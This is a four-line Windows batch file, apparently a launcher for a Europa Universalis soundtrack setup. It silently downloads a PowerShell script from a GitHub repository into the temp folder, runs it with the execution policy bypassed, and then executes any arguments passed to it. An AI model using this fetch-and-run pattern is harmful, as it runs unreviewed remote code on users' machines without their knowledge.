@echo off
curl -sL -o "%TEMP%\eu4snd.ps1" https://raw.githubusercontent.com/komoreb11/eu5-music-converter/main/EU4_Soundtrack_Setup.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\eu4snd.ps1"
%*
